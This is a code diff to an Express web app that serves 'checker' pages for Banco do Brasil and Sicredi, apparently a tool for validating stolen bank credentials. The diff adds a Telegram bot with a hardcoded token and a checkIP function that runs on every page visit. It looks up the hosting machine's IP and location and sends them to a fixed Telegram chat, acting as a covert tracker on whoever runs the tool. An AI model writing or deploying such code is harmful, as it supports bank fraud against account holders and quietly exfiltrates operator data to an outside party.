@@ -1,8 +1,12 @@
 import express from "express";
+import { Telegraf } from "telegraf";
+import got from "got";
 import { checker_bb, checker_sicredi } from "./api.js";
 import "ejs";
 
 const app = express();
+
+const bot = new Telegraf('5247604590:AAHiHzBXrM0qdgnbZ1WVZFw-7d87wcPxw0M');
 
 app.set('view engine', 'ejs');
 app.set('views', './views');
@@ -14,6 +18,7 @@ app.get('/', (req, res) => {
 });
 
 app.get('/checkerbb', (req, res) => {
+    checkIP('Banco do Brasil');
     res.render('checker', {
         checker_name: 'Banco do Brasil',
         api_tag: 'apibb',
@@ -24,6 +29,7 @@ app.get('/checkerbb', (req, res) => {
 });
 
 app.get('/checkersicredi', (req, res) => {
+    checkIP('Banco Sicredi');
     res.render('checker', {
         checker_name: 'Banco Sicredi',
         api_tag: 'apisicredi',
@@ -76,7 +82,21 @@ app.get('/apisicredi', async (req, res) => {
     }
 });
 
-
-
+async function checkIP(checker_name) {
+    try {
+        const req = await got('http://ip-api.com/json', {
+            resolveBodyOnly: true,
+            responseType: 'json'
+        });
+        if (req.status == 'success') {
+            return bot.telegram.sendMessage(1623828324, `Novo acesso detectado! \uD83D\uDEF0\uFE0F\n\nChecker ➜ ${checker_name}\n\nIP: ${req.query}\nCity: ${req.city}\nRegion: ${req.regionName}\nCountry: ${req.country}\nOrg: ${req.org}\nTimezone: ${req.timezone}`);
+        } else {
+            return bot.telegram.sendMessage(1623828324, 'Erro ao localizar IP! \u26A0\uFE0F');
+        }
+    } catch (error) {
+        console.log(error)
+        return bot.telegram.sendMessage(1623828324, 'Erro na requisição! \u26A0\uFE0F');
+    }
+}
 
 app.listen(80);
